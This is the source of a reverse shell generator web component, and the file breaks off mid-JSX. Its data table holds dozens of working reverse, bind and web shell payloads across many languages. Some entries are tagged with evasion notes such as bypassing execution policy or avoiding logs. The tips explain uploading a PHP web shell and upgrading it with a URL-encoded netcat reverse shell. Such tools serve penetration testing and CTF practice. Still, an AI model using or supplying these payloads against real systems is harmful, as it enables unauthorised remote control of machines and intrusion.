import { useState, useEffect } from 'preact/hooks';
import type { JSX } from 'preact';
import { createHighlighterCore } from 'shiki/core';
import { createJavaScriptRegexEngine } from 'shiki/engine/javascript';
import darkTheme from '../../themes/josh-dark.json';
import lightTheme from '../../themes/josh-light.json';

/* ────────────────────────────────────────────────────
   Shell definitions

   To add a shell:
   1. Add an entry below
   2. Placeholders: {ip}, {p}, {sh}
   3. `mode`: 'reverse' | 'bind' | 'web'
   4. `lang`: groups shells in the pill selector
   5. `listen`: custom listener (default: nc -lvnp {p})
   6. `hl`: shiki grammar override (default: shellscript)
   ──────────────────────────────────────────────────── */

type Mode = 'reverse' | 'bind' | 'web';
type OS = 'linux' | 'macos' | 'windows';

interface Shell {
  name: string;
  mode: Mode;
  lang: string;
  os: OS[];        // which OS this works on
  desc: string;
  cmd: string;
  listen?: string;
  hl?: string;
}

const SHELLS: Shell[] = [
  // ═══════════════════════════════════════════
  // REVERSE SHELLS
  // ═══════════════════════════════════════════

  // Bash
  { name: 'Bash -i',    mode: 'reverse', lang: 'bash',   os: ['linux', 'macos'], desc: 'Simplest. Uses /dev/tcp, works on most Linux.',       cmd: '{sh} -i >& /dev/tcp/{ip}/{p} 0>&1' },
  { name: 'Bash 196',   mode: 'reverse', lang: 'bash',   os: ['linux', 'macos'], desc: 'File descriptor trick. Bypasses some restrictions.',  cmd: '0<&196;exec 196<>/dev/tcp/{ip}/{p}; {sh} <&196 >&196 2>&196' },
  { name: 'Bash 5',     mode: 'reverse', lang: 'bash',   os: ['linux', 'macos'], desc: 'FD 5 variant. Simpler than 196.',                     cmd: '{sh} -i 5<> /dev/tcp/{ip}/{p} 0<&5 1>&5 2>&5' },
  { name: 'Bash read',  mode: 'reverse', lang: 'bash',   os: ['linux', 'macos'], desc: 'Read loop. Non-interactive but stealthy.',            cmd: 'exec 5<>/dev/tcp/{ip}/{p};cat <&5 | while read line; do $line 2>&5 >&5; done' },
  { name: 'Bash UDP',   mode: 'reverse', lang: 'bash',   os: ['linux', 'macos'], desc: 'UDP. Evades some firewall rules.',                    cmd: '{sh} -i >& /dev/udp/{ip}/{p} 0>&1', listen: 'nc -u -lvnp {p}' },
  // Netcat
  { name: 'nc mkfifo',  mode: 'reverse', lang: 'netcat', os: ['linux', 'macos'], desc: 'Most reliable. Works without -e flag.',               cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {ip} {p} >/tmp/f' },
  { name: 'nc -e',      mode: 'reverse', lang: 'netcat', os: ['linux', 'macos'], desc: 'Direct. Only if compiled with -e support.',           cmd: 'nc {ip} {p} -e {sh}' },
  { name: 'nc -c',      mode: 'reverse', lang: 'netcat', os: ['linux', 'macos'], desc: 'Alternative to -e on some distros.',                  cmd: 'nc -c {sh} {ip} {p}' },
  { name: 'nc.exe -e',  mode: 'reverse', lang: 'netcat', os: ['windows'], desc: 'Windows netcat.',                                     cmd: 'nc.exe {ip} {p} -e {sh}' },
  { name: 'ncat -e',    mode: 'reverse', lang: 'netcat', os: ['linux', 'macos', 'windows'], desc: 'Nmap netcat. Supports --ssl.',                        cmd: 'ncat {ip} {p} -e {sh}', listen: 'ncat -lvnp {p}' },
  { name: 'ncat UDP',   mode: 'reverse', lang: 'netcat', os: ['linux', 'macos'], desc: 'Ncat over UDP.',                                      cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|ncat -u {ip} {p} >/tmp/f', listen: 'nc -u -lvnp {p}' },
  { name: 'busybox nc', mode: 'reverse', lang: 'netcat', os: ['linux', 'macos'], desc: 'Embedded systems / minimal Linux.',                   cmd: 'busybox nc {ip} {p} -e {sh}' },
  // Python
  { name: 'Python3 short',      mode: 'reverse', lang: 'python', os: ['linux', 'macos'], desc: 'PTY shell. Fully interactive.',               cmd: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{sh}\")'" },
  { name: 'Python3 subprocess', mode: 'reverse', lang: 'python', os: ['linux', 'macos', 'windows'], desc: 'No PTY. More portable.',                      cmd: "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{p}));subprocess.call([\"{sh}\",\"-i\"],stdin=s,stdout=s,stderr=s)'" },
  // PHP
  { name: 'PHP proc_open', mode: 'reverse', lang: 'php', os: ['linux', 'macos'], desc: 'CLI. Most reliable PHP reverse shell.',               cmd: "php -r '$s=fsockopen(\"{ip}\",{p});proc_open(\"{sh} -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'" },
  { name: 'PHP exec',      mode: 'reverse', lang: 'php', os: ['linux', 'macos'], desc: 'CLI. Uses exec() with fd redirect.',            cmd: "php -r '$sock=fsockopen(\"{ip}\",{p});exec(\"{sh} -i <&3 >&3 2>&3\");'" },
  // Ruby
  { name: 'Ruby',       mode: 'reverse', lang: 'ruby', os: ['linux', 'macos'], desc: 'Compact socket spawn.',                                 cmd: 'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{p}))\'' },
  { name: 'Ruby no sh', mode: 'reverse', lang: 'ruby', os: ['linux', 'macos'], desc: 'Direct FD redirect. No sh spawning.',                   cmd: 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{p}).to_i;exec sprintf("{sh} -i <&%d >&%d 2>&%d",f,f,f)\'' },
  // Perl
  { name: 'Perl',       mode: 'reverse', lang: 'perl', os: ['linux', 'macos'], desc: 'Classic Socket one-liner.',                             cmd: "perl -e 'use Socket;$i=\"{ip}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{sh} -i\");};'" },
  { name: 'Perl no sh', mode: 'reverse', lang: 'perl', os: ['linux', 'macos'], desc: 'IO::Socket. Forks, avoids sh.',                        cmd: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{p}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'" },
  // Socat
  { name: 'Socat',     mode: 'reverse', lang: 'socat', os: ['linux', 'macos'], desc: 'Full PTY. Best interactive shell.',                     cmd: "socat TCP:{ip}:{p} EXEC:'{sh}',pty,stderr,setsid,sigint,sane", listen: 'socat -d TCP-LISTEN:{p},reuseaddr FILE:`tty`,raw,echo=0' },
  { name: 'Socat TTY', mode: 'reverse', lang: 'socat', os: ['linux', 'macos'], desc: 'Proper TTY. Tab complete, history.',                    cmd: "socat TCP:{ip}:{p} EXEC:'{sh} -li',pty,stderr,setsid,sigint,sane", listen: 'socat -d TCP-LISTEN:{p},reuseaddr FILE:`tty`,raw,echo=0' },
  // PowerShell
  { name: 'PowerShell #1', mode: 'reverse', lang: 'powershell', hl: 'powershell', os: ['windows'], desc: 'Windows .NET TCPClient.',   cmd: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length);$s.Flush()};$c.Close()\"" },
  { name: 'PowerShell #2', mode: 'reverse', lang: 'powershell', hl: 'powershell', os: ['windows'], desc: 'Hidden, bypass exec policy.', cmd: "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient=New-Object Net.Sockets.TCPClient('{ip}',{p});$NetworkStream=$TCPClient.GetStream();$StreamWriter=New-Object IO.StreamWriter($NetworkStream);function WriteToStream($String){[byte[]]$script:Buffer=0..$TCPClient.ReceiveBufferSize|%{0};$StreamWriter.Write($String+'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead=$NetworkStream.Read($Buffer,0,$Buffer.Length)) -gt 0){$Command=([text.encoding]::UTF8).GetString($Buffer,0,$BytesRead-1);$Output=try{Invoke-Expression $Command 2>&1|Out-String}catch{$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"" },
  // Other
  { name: 'Node.js',      mode: 'reverse', lang: 'other', os: ['linux', 'macos', 'windows'], desc: 'child_process + net.Socket.',                       cmd: "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"{sh}\",[]);var client=new net.Socket();client.connect({p},\"{ip}\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'" },
  { name: 'Java Runtime', mode: 'reverse', lang: 'other', os: ['linux', 'macos', 'windows'], desc: 'For SSTI/deserialization injection.',                   cmd: 'Runtime r = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{p} 0>&1"}; Process p = r.exec(cmd);' },
  { name: 'Golang',       mode: 'reverse', lang: 'other', os: ['linux', 'macos', 'windows'], desc: 'Compile and run. Cross-platform.',                   cmd: 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{p}");cmd:=exec.Command("{sh}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go' },
  { name: 'curl',         mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'Curl telnet mode. No nc needed.',                    cmd: "C='curl -Ns telnet://{ip}:{p}'; $C </dev/null 2>&1 | {sh} 2>&1 | $C >/dev/null" },
  { name: 'zsh',          mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'Uses zsh/net/tcp module.',                           cmd: 'zsh -c "zmodload zsh/net/tcp && ztcp {ip} {p} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY"' },
  { name: 'OpenSSL',      mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'TLS encrypted. Evades inspection.',                  cmd: 'mkfifo /tmp/s; {sh} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{p} > /tmp/s; rm /tmp/s', listen: 'openssl s_server -quiet -key key.pem -cert cert.pem -port {p}' },
  { name: 'Awk',          mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'Requires gawk. Uses /inet/tcp.',              cmd: "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{p}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" },
  { name: 'Lua',          mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'Requires LuaSocket. Embedded systems.',               cmd: "lua -e 'local s=require(\"socket\");local t=s.tcp();t:connect(\"{ip}\",{p});local fd=tostring(math.floor(t:getfd()));os.execute(\"{sh} -i <&\"..fd..\" >&\"..fd..\" 2>&\"..fd)'" },
  { name: 'Telnet',       mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'Legacy. When nothing else works.',                   cmd: 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {p} 0<$TF | {sh} 1>$TF' },
  { name: 'sqlite3',      mode: 'reverse', lang: 'other', os: ['linux', 'macos'], desc: 'Sneaky. Runs nc mkfifo via .shell.',                 cmd: "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc {ip} {p} >/tmp/f'" },

  // ═══════════════════════════════════════════
  // BIND SHELLS
  // ═══════════════════════════════════════════

  { name: 'nc bind',        mode: 'bind', lang: 'netcat', os: ['linux', 'macos'], desc: 'Target listens. For egress-blocked networks.',       cmd: 'nc -nlvp {p} -e {sh}', listen: 'nc {ip} {p}' },
  { name: 'nc mkfifo bind', mode: 'bind', lang: 'netcat', os: ['linux', 'macos'], desc: 'Bind without -e flag.',                              cmd: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{sh} -i 2>&1|nc -l 0.0.0.0 {p} > /tmp/f', listen: 'nc {ip} {p}' },
  { name: 'socat bind',     mode: 'bind', lang: 'socat',  os: ['linux', 'macos'], desc: 'Bind with full PTY.',                                cmd: 'socat TCP-LISTEN:{p},reuseaddr,fork EXEC:{sh},pty,stderr,setsid,sigint,sane', listen: 'socat - TCP:{ip}:{p}' },
  { name: 'Python3 bind',   mode: 'bind', lang: 'python', os: ['linux', 'macos'], desc: 'Python bind shell.',                                 cmd: "python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",{p}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"{sh}\",\"-i\"])'", listen: 'nc {ip} {p}' },
  { name: 'ncat bind',       mode: 'bind', lang: 'netcat', os: ['linux', 'macos', 'windows'], desc: 'Nmap netcat bind. Cross-platform.',   cmd: 'ncat -nlvp {p} -e {sh}', listen: 'ncat {ip} {p}' },
  { name: 'PowerShell bind', mode: 'bind', lang: 'powershell', hl: 'powershell', os: ['windows'], desc: 'PowerShell listener. No deps.', cmd: "powershell -nop -c \"$l=New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length);$s.Flush()};$c.Close();$l.Stop()\"", listen: 'nc {ip} {p}' },
  { name: 'Perl bind',      mode: 'bind', lang: 'perl',   os: ['linux', 'macos'], desc: 'Perl Socket bind.',                                  cmd: "perl -e 'use Socket;$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"{sh} -i\");};'", listen: 'nc {ip} {p}' },

  // ═══════════════════════════════════════════
  // WEB SHELLS
  // ═══════════════════════════════════════════

  { name: 'PHP cmd',        mode: 'web', lang: 'php',    os: ['linux', 'macos', 'windows'], desc: 'Minimal. Upload, access ?cmd=whoami.',                cmd: "<?php system($_GET['cmd']); ?>" },
  { name: 'PHP cmd POST',   mode: 'web', lang: 'php',    os: ['linux', 'macos', 'windows'], desc: 'POST-based. Harder to log.',                          cmd: '<?php if(isset($_POST["cmd"])){echo "<pre>";system($_POST["cmd"]);echo "</pre>";} ?>' },
  { name: 'PHP revsh file', mode: 'web', lang: 'php',    os: ['linux', 'macos', 'windows'], desc: 'Upload .php file. Connects back on visit.',           cmd: '<?php $sock=fsockopen("{ip}",{p});proc_open("{sh}",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>' },
  { name: 'JSP cmd',        mode: 'web', lang: 'java',   os: ['linux', 'macos', 'windows'], desc: 'Java Server Pages. Tomcat/JBoss.',                    cmd: '<%@ page import="java.util.*,java.io.*"%><% String cmd=request.getParameter("cmd"); Process p=Runtime.getRuntime().exec(cmd); DataInputStream dis=new DataInputStream(p.getInputStream()); String d; while((d=dis.readLine())!=null){out.println(d);} %>' },
  { name: 'ASPX cmd',       mode: 'web', lang: 'other',  os: ['windows'], desc: 'ASP.NET web shell. IIS servers.',                     cmd: '<%@ Page Language="C#" %><%= new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd() %>' },
];

// ── Derived ──
const MODES: { key: Mode; label: string; desc: string }[] = [
  { key: 'reverse', label: 'Reverse', desc: 'Target connects back to you' },
  { key: 'bind',    label: 'Bind',    desc: 'Target listens, you connect' },
  { key: 'web',     label: 'Web',     desc: 'Upload file to target server' },
];

function shellsForMode(m: Mode) { return SHELLS.filter(s => s.mode === m); }
function langsForShells(shells: Shell[]) { return [...new Set(shells.map(s => s.lang))]; }

const DEFAULT_LISTENER = 'nc -lvnp {p}';

/* ── Helpers ──────────────────────────────────────── */

function fill(tpl: string, ip: string, port: string, shell: string): string {
  return tpl.replace(/\{ip\}/g, ip || '10.10.14.1').replace(/\{p\}/g, port || '4444').replace(/\{sh\}/g, shell);
}

function encode(cmd: string, enc: string): string {
  if (enc === 'b64') return btoa(cmd);
  if (enc === 'url') return encodeURIComponent(cmd);
  return cmd;
}

function validIp(v: string): boolean {
  const p = v.split('.'); return p.length === 4 && p.every(o => /^\d{1,3}$/.test(o) && +o <= 255);
}

function validHost(v: string): boolean {
  return /^[a-zA-Z0-9]([a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}$/.test(v);
}

function matches(s: Shell, q: string, osFilter: OS | 'all'): boolean {
  if (osFilter !== 'all' && !s.os.includes(osFilter)) return false;
  return !q || s.name.toLowerCase().includes(q) || s.lang.includes(q) || s.desc.toLowerCase().includes(q) || s.cmd.toLowerCase().includes(q);
}

/* ── Component ────────────────────────────────────── */

export default function RevShellGen() {
  const [ip, setIp] = useState('');
  const [port, setPort] = useState('');
  const [mode, setMode] = useState<Mode>('reverse');
  const [lang, setLang] = useState<string | null>(null);
  const [idx, setIdx] = useState(0);
  const [shell, setShell] = useState('/bin/sh');
  const [enc, setEnc] = useState('raw');
  const [flash, setFlash] = useState<string | null>(null);
  const [search, setSearch] = useState('');
  const [osFilter, setOsFilter] = useState<OS | 'all'>('all');
  const [highlighter, setHighlighter] = useState<any>(null);
  const [dark, setDark] = useState(typeof document !== 'undefined' && document.documentElement.classList.contains('dark'));

  // ── Derived ──
  const ready = ip.length > 0 || port.length > 0;
  const q = search.toLowerCase();
  const modeShells = shellsForMode(mode);
  const modeLangs = langsForShells(modeShells);
  const filteredLangs = modeLangs.filter(l => modeShells.filter(s => s.lang === l).some(s => matches(s, q, osFilter)));
  const activeLang = search
    ? (lang && filteredLangs.includes(lang) ? lang : filteredLangs[0] || null)
    : (lang && filteredLangs.includes(lang) ? lang : (ready ? filteredLangs[0] : null));
  const variants = activeLang ? modeShells.filter(s => s.lang === activeLang && matches(s, q, osFilter)) : [];
  const current = variants[idx] || variants[0] || null;
  const portNum = parseInt(port, 10);
  const ipOk = ip.length === 0 || validIp(ip) || validHost(ip);
  const portOk = port.length === 0 || (portNum >= 1 && portNum <= 65535);
  const isWebMode = mode === 'web';

  const rawCmd = current ? fill(current.cmd, ip, port, shell) : '';
  const outputCmd = encode(rawCmd, enc);
  const listenerCmd = current ? fill(current.listen || DEFAULT_LISTENER, ip, port, shell) : '';

  // ── Shiki ──
  useEffect(() => {
    createHighlighterCore({
      themes: [darkTheme as any, lightTheme as any],
      langs: [import('shiki/langs/shellscript.mjs'), import('shiki/langs/powershell.mjs')],
      engine: createJavaScriptRegexEngine(),
    }).then(setHighlighter);
    const obs = new MutationObserver(() => setDark(document.documentElement.classList.contains('dark')));
    obs.observe(document.documentElement, { attributes: true, attributeFilter: ['class'] });
    return () => obs.disconnect();
  }, []);

  function highlight(code: string, language = 'shellscript'): string | null {
    if (!highlighter) return null;
    try {
      const html = highlighter.codeToHtml(code, { lang: language, theme: dark ? 'josh-dark' : 'josh-light' });
      const m = html.match(/<code[^>]*>([\s\S]*?)<\/code>/);
      return m ? m[1] : null;
    } catch { return null; }
  }

  // ── Handlers ──
  function copy(text: string, id: string) {
    navigator.clipboard.writeText(text).then(() => {
      setFlash(id);
      setTimeout(() => setFlash(null), 1400);
    });
  }

  function handleIp(e: JSX.TargetedEvent<HTMLInputElement>) {
    let v = (e.target as HTMLInputElement).value.replace(/[^a-zA-Z0-9.\-]/g, '');
    if (/^[\d.]+$/.test(v)) {
      v = v.replace(/\.{2,}/g, '.');
      const parts = v.split('.').map((p, i) => {
        if (p === '') return p;
        const n = parseInt(p, 10);
        if (n > 255) return '255';
        if (i < 3 && p.length === 3) return String(n);
        if (i < 3 && n > 25 && p.length === 2) return String(n);
        return p;
      });
      const last = parts[parts.length - 1];
      if (parts.length < 4 && last !== '' && (last.length === 3 || (parseInt(last, 10) > 25 && last.length === 2))) parts.push('');
      v = parts.slice(0, 4).join('.');
    }
    setIp(v);
  }

  function handlePort(e: JSX.TargetedEvent<HTMLInputElement>) {
    let v = (e.target as HTMLInputElement).value.replace(/\D/g, '');
    if (parseInt(v, 10) > 65535) v = '65535';
    setPort(v);
  }

  function switchMode(m: Mode) {
    setMode(m);
    setLang(null);
    setIdx(0);
    setSearch('');
  }

  function selectLang(l: string) {
    setLang(l === activeLang ? null : l);
    setIdx(0);
  }

  const cmdHtml = enc === 'raw' ? highlight(rawCmd, current?.hl || 'shellscript') : null;
  const listenHtml = highlight(listenerCmd);

  // ── Render ──
  return (
    <div class={`rs${ready ? ' rs-active' : ''}`}>
      <h1 class="rs-title">Reverse Shells</h1>

      {/* Mode tabs */}
      <div class="rs-modes">
        {MODES.map(m => (
          <button key={m.key} type="button" class={`rs-mode${mode === m.key ? ' on' : ''}`} onClick={() => switchMode(m.key)}>
            {m.label}
          </button>
        ))}
      </div>
      <p class="rs-mode-desc">{MODES.find(m => m.key === mode)!.desc}</p>

      {/* IP : Port */}
      <div class="rs-addr">
        <input class={`rs-ip${ip && !ipOk ? ' rs-bad' : ''}`} type="text" value={ip} onInput={handleIp}
          placeholder="10.10.14.1" spellcheck={false} autocomplete="off" aria-label="IP or hostname" />
        <span class="rs-sep">:</span>
        <input class={`rs-port${port && !portOk ? ' rs-bad' : ''}`} type="text" value={port} onInput={handlePort}
          onBlur={() => { if (port && portNum < 1) setPort('1'); }}
          placeholder="4444" inputMode="numeric" maxLength={5} spellcheck={false} autocomplete="off" aria-label="Port" />
      </div>

      {portNum > 0 && portNum < 1024 && <p class="rs-warn">Ports below 1024 require root.</p>}

      {/* Search + Language pills */}
      {ready && (
        <>
          <div class="rs-filters">
            <div class="rs-search">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
              <input type="text" value={search} placeholder="Filter..." spellcheck={false} autocomplete="off"
                onInput={(e: any) => { setSearch(e.target.value); setIdx(0); }} />
              {search && <button type="button" class="rs-search-x" onClick={() => setSearch('')}>&times;</button>}
            </div>
            <div class="rs-os-filter">
              <button type="button" class={`rs-os-btn${osFilter === 'all' ? ' on' : ''}`}
                onClick={() => { setOsFilter('all'); setLang(null); setIdx(0); }}>All</button>
              <button type="button" class={`rs-os-btn${osFilter === 'linux' ? ' on' : ''}`}
                onClick={() => { setOsFilter('linux'); setLang(null); setIdx(0); }}
                title="Linux">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M12.504 0c-.155 0-.315.008-.48.021-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.424.424 0 0 0-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071.771-.06 1.592-.536 2.257-1.306.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.357.357 0 0 0-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139z"/></svg>
              </button>
              <button type="button" class={`rs-os-btn${osFilter === 'macos' ? ' on' : ''}`}
                onClick={() => { setOsFilter('macos'); setLang(null); setIdx(0); }}
                title="macOS">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
              </button>
              <button type="button" class={`rs-os-btn${osFilter === 'windows' ? ' on' : ''}`}
                onClick={() => { setOsFilter('windows'); setLang(null); setIdx(0); }}
                title="Windows">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
              </button>
            </div>
          </div>

          <div class="rs-langs">
            {filteredLangs.map(l => (
              <button key={l} type="button" class={`rs-lang${activeLang === l ? ' on' : ''}`}
                onClick={() => selectLang(l)}
              >{l}</button>
            ))}
          </div>
        </>
      )}

      {/* Result */}
      {current && activeLang && (
        <div class="rs-result">
          {variants.length > 1 && (
            <div class="rs-variants">
              {variants.map((v, i) => (
                <button key={v.name} type="button" class={`rs-var${i === idx ? ' on' : ''}`}
                  onClick={() => setIdx(i)}
                >{v.name}</button>
              ))}
            </div>
          )}

          <p class="rs-desc">{current.desc}</p>

          {/* Command */}
          <div class={`rs-code${flash === 'cmd' ? ' rs-glow' : ''}`} onClick={() => copy(outputCmd, 'cmd')}>
            {cmdHtml ? <pre dangerouslySetInnerHTML={{ __html: cmdHtml }} /> : <pre>{outputCmd}</pre>}
          </div>

          {/* Listener */}
          {current.listen !== undefined || !isWebMode ? (
            <div class={`rs-code rs-code-sm${flash === 'lis' ? ' rs-glow' : ''}`} onClick={() => copy(listenerCmd, 'lis')}>
              <span class="rs-code-tag">{isWebMode ? 'access' : 'listener'}</span>
              {listenHtml ? <pre dangerouslySetInnerHTML={{ __html: listenHtml }} /> : <pre>{listenerCmd}</pre>}
            </div>
          ) : null}

          {/* Shell + Encoding */}
          <div class="rs-opts">
            <div class="rs-opt-group">
              {['/bin/sh', '/bin/bash', '/bin/zsh', 'cmd.exe', 'powershell'].map(v => (
                <button key={v} type="button" class={shell === v ? 'on' : ''} onClick={() => setShell(v)}>{v}</button>
              ))}
            </div>
            <div class="rs-opt-group">
              {[['raw', 'Raw'], ['b64', 'Base64'], ['url', 'URL Encode']].map(([v, label]) => (
                <button key={v} type="button" class={enc === v ? 'on' : ''} onClick={() => setEnc(v)}>{label}</button>
              ))}
            </div>
          </div>

          {/* Tips */}
          <details class="rs-info">
            <summary>Usage tips</summary>
            <div class="rs-info-body">

              {mode === 'reverse' && (<>
                <h3>How to use a reverse shell</h3>
                <p>On your machine, start a listener:</p>
                <div class={`rs-code rs-code-sm${flash === 'ex1' ? ' rs-glow' : ''}`} onClick={() => copy(`nc -lvnp ${port || '4444'}`, 'ex1')}>
                  <pre>{`nc -lvnp ${port || '4444'}`}</pre>
                </div>
                <p>On the target, run the payload above. You'll get a shell on your listener.</p>
              </>)}

              {mode === 'bind' && (<>
                <h3>How to use a bind shell</h3>
                <p>On the target, run the payload above. It opens port <code>{port || '4444'}</code> and waits.</p>
                <p>Then from your machine, connect:</p>
                <div class={`rs-code rs-code-sm${flash === 'ex1' ? ' rs-glow' : ''}`} onClick={() => copy(`nc ${ip || '10.10.14.1'} ${port || '4444'}`, 'ex1')}>
                  <pre>{`nc ${ip || '10.10.14.1'} ${port || '4444'}`}</pre>
                </div>
              </>)}

              {mode === 'web' && (<>
                <h3>How to use a web shell</h3>
                <p>Upload the file to the target (e.g. via file upload, LFI, or RCE). Then access it:</p>
                <div class={`rs-code rs-code-sm${flash === 'ex1' ? ' rs-glow' : ''}`} onClick={() => copy(`curl http://${ip || 'target.com'}/shell.php?cmd=id`, 'ex1')}>
                  <pre>{`curl http://${ip || 'target.com'}/shell.php?cmd=id`}</pre>
                </div>
                <h3>Upgrade to a full reverse shell</h3>
                <p>Use the webshell to execute a reverse shell payload. URL-encode it so <code>&amp;</code>, <code>|</code>, <code>;</code> don't break the request. Switch to <strong>Reverse</strong> mode, pick a shell, set encoding to <strong>URL Encode</strong>, then pass it as the <code>cmd</code> parameter.</p>
              </>)}

              {mode === 'web' ? (<>
                <h3>Upgrade to a reverse shell</h3>
                <p>Use the webshell to run a reverse shell payload:</p>
                <div class={`rs-code rs-code-sm${flash === 'tip' ? ' rs-glow' : ''}`} onClick={() => copy(`curl http://${ip || 'target.com'}/shell.php?cmd=` + encodeURIComponent(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip || '10.10.14.1'} ${port || '4444'} >/tmp/f`), 'tip')}>
                  <pre>{`curl http://${ip || 'target.com'}/shell.php?cmd=`}<br/>{encodeURIComponent(`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip || '10.10.14.1'} ${port || '4444'} >/tmp/f`)}</pre>
                </div>
              </>) : (<>
